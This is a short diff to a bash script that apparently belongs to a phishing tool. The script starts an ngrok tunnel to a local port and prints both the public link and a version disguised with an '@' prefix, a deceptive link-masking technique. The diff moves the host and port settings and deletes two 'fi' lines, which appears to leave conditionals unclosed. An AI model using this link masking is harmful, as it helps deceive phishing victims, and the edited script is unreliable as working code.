@@ -18,6 +18,10 @@ echo ""
 echo ""
 read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Want to Choose Service  : \e[1;91m (1/2)  : \e[0m' option
 echo""
+
+HOST='127.0.0.1'
+PORT='4444'
+
 echo""
 echo""
 if [[ $option == *'1'* ]]; then
@@ -70,7 +74,7 @@ rm -rf ngrok
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
 		else
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
-		fi
+
 echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
@@ -87,15 +91,6 @@ echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 
-fi
-
-
 
 echo
 
-HOST='127.0.0.1'
-PORT='4444'
-
-echo
-echo ""
-echo -e ""
